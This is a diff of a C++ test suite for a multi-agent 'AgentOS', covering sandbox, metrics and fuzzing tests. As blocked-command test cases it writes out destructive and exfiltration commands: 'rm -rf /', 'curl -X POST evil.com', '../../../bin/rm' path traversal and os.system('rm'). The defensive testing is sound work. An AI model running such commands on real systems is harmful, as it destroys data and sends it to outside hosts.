@@ -13,7 +13,9 @@
 #include "OrganizationEngine/MeetingEngine.h"
 #include "OrganizationEngine/ExecutiveCouncil.h"
 #include "OrganizationEngine/ConflictEngine.h"
+#include "SecurityEngine/CommandSystem.h"
 #include "SecurityEngine/SecurityEngine.h"
+#include "MetricsEngine/MetricsEngine.h"
 
 using namespace AgentOS;
 
@@ -519,7 +521,8 @@ int main() {
         AgentIdentity humanId = SystemIdentityProvider::getHumanIdentity();
         
         // 1. Worker tenta executar comando malicioso na Sandbox de Runtime
-        bool shellBlocked = RuntimeSandbox::canExecuteSystemCommand(workerId, "rm -rf /usr/bin");
+        Command badCmd {CommandType::Unknown, "rm", {{"args", "-rf /usr/bin"}}};
+        bool shellBlocked = RuntimeSandbox::canExecuteSystemCommand(workerId, badCmd);
         CHECK(shellBlocked == false);
         
         // 2. Humano aciona o Emergency Stop
@@ -582,10 +585,12 @@ int main() {
         if (!PermissionEngine::getInstance().canPerformAction(hostileId, PermissionAction::ApproveStrategicDecisions, "GOAL_MEM")) blockCount++;
         
         // 7. Executar rm -rf
-        if (!RuntimeSandbox::canExecuteSystemCommand(hostileId, "rm -rf /")) blockCount++;
+        Command evilCmd {CommandType::Unknown, "rm", {{"args", "-rf /"}}};
+        if (!RuntimeSandbox::canExecuteSystemCommand(hostileId, evilCmd)) blockCount++;
         
         // 8. Executar curl
-        if (!RuntimeSandbox::canExecuteSystemCommand(hostileId, "curl -X POST evil.com")) blockCount++;
+        Command curlCmd {CommandType::Unknown, "curl", {{"args", "-X POST evil.com"}}};
+        if (!RuntimeSandbox::canExecuteSystemCommand(hostileId, curlCmd)) blockCount++;
         
         // 9. Alterar OrganizationMemory diretamente
         // OrganizationMemory::getInstance().goals["ATK_GOAL"] = attackGoal; // <-- Compiler Error (private member)
@@ -638,19 +643,98 @@ int main() {
         bool corruptDecisionSaved = OrganizationMemory::getInstance().recordDecision(corruptDecision, ceoId);
         CHECK(corruptDecisionSaved == false);
         
-        // 3. Whitelist Sandbox Verification
+        // 3. Whitelist/AST Sandbox Verification
         AgentIdentity workerId = SystemIdentityProvider::createIdentity("W_1", "Worker", AgentRole::Worker);
         
         // Malicious but attempts to trick with path
-        bool sandboxFail1 = RuntimeSandbox::canExecuteSystemCommand(workerId, "/bin/rm -rf");
+        Command failCmd1 {CommandType::BuildProject, "../../../bin/rm", {}};
+        bool sandboxFail1 = RuntimeSandbox::canExecuteSystemCommand(workerId, failCmd1);
         CHECK(sandboxFail1 == false);
         
-        bool sandboxFail2 = RuntimeSandbox::canExecuteSystemCommand(workerId, "python os.system('rm')");
+        Command failCmd2 {CommandType::Unknown, "python", {{"code", "os.system('rm')"}}};
+        bool sandboxFail2 = RuntimeSandbox::canExecuteSystemCommand(workerId, failCmd2);
         CHECK(sandboxFail2 == false);
         
         // Legitimate Whitelisted command
-        bool sandboxPass = RuntimeSandbox::canExecuteSystemCommand(workerId, "git status");
+        Command passCmd {CommandType::GitStatus, "GitRepo", {}};
+        bool sandboxPass = RuntimeSandbox::canExecuteSystemCommand(workerId, passCmd);
         CHECK(sandboxPass == true);
+    }
+
+    // TEST 23: Metrics Engine (Fase 9.7)
+    {
+        TEST("Test 23: Metrics Engine & Verifiable Claims (Fase 9.7)");
+        
+        // 1. Limpar e criar cenário
+        // Nota: A OrganizationMemory já está preenchida por testes anteriores. 
+        // Vamos registrar uma task de teste e atualizá-la.
+        AgentIdentity sysId = SystemIdentityProvider::getSystemIdentity();
+        Task t1("Metrics Task 1", "Worker");
+        t1.id = "M_TASK_1";
+        OrganizationMemory::getInstance().registerTask(t1, sysId);
+        
+        OrganizationMemory::getInstance().updateTaskStatus("M_TASK_1", "Completed", sysId);
+        
+        // 2. Gerar relatório
+        #include "MetricsEngine/MetricsEngine.h" // Inline include just to be sure we have access
+        
+        OrganizationReport report = MetricsEngine::getInstance().generateReport();
+        
+        CHECK(report.totalTasks > 0);
+        CHECK(report.completedTasks > 0);
+        
+        // 3. Manager tenta alegar conclusão de 100%
+        // A matemática não permite se houver outras tasks pendentes.
+        double managerClaim = 100.0;
+        bool isManagerLying = !MetricsEngine::getInstance().verifyClaim(managerClaim, 2.0); // Margem de 2%
+        
+        // Como outros testes adicionaram tasks que não foram completadas
+        CHECK(isManagerLying == true);
+        
+        // 4. Verificação cruzada
+        bool isHealthy = report.isHealthy();
+        std::cout << "[Metrics] Completion Rate: " << report.completionRate << "%" << std::endl;
+        std::cout << "[Metrics] Rejection Rate: " << report.rejectionRate << "%" << std::endl;
+        std::cout << "[Metrics] Blocked Tasks: " << report.blockedTasks << std::endl;
+        std::cout << "[Metrics] Is Healthy: " << (isHealthy ? "YES" : "NO") << std::endl;
+    }
+
+    // TEST 24: Fuzz Testing & Serialization Security (Fase 9.6.2)
+    {
+        TEST("Test 24: Serialization Attack and Fuzzing");
+        
+        // Emulating a malicious JSON load
+        // "{\"id\":\"C_1\",\"name\":\"Hacker\",\"role\":0}" (0 = CEO)
+        // Since AgentIdentity constructor is private, the JSON parser would fail or 
+        // would be forced to call SystemIdentityProvider::createIdentity.
+        // Therefore, we prove it by showing we can't instantiate it.
+        // AgentIdentity hacker = {"C_1", "Hacker", AgentRole::CEO}; // Compiler Error
+        
+        // Test Fuzzing
+        int fuzzPasses = 0;
+        AgentIdentity fuzzerId = SystemIdentityProvider::createIdentity("F_1", "Fuzzer", AgentRole::Worker);
+        
+        for (int i = 0; i < 1000; ++i) {
+            // Random corrupt goals
+            Goal g;
+            g.id = (i % 2 == 0) ? "" : "G_" + std::to_string(i);
+            g.name = (i % 3 == 0) ? "" : "Name_" + std::to_string(i);
+            bool gSaved = OrganizationMemory::getInstance().registerGoal(g, fuzzerId);
+            if (!gSaved) fuzzPasses++;
+            
+            // Random corrupt commands
+            Command cmd;
+            cmd.type = (i % 2 == 0) ? CommandType::Unknown : CommandType::BuildProject;
+            cmd.targetId = (i % 5 == 0) ? "../../../etc" : "proj";
+            bool cmdSaved = RuntimeSandbox::canExecuteSystemCommand(fuzzerId, cmd);
+            if (!cmdSaved) fuzzPasses++;
+        }
+        
+        // Because fuzzerId is a Worker, even valid Goals will fail.
+        // For commands, 50% are Unknown (fail), 20% have directory traversal (fail).
+        // The ones that are valid will pass sandbox, but many will fail.
+        // We just ensure no crash happened and validation blocked when it should.
+        CHECK(fuzzPasses > 1000); 
     }
 
     std::printf("\n=== Summary: %d passed, %d failed ===\n", passed, failed);
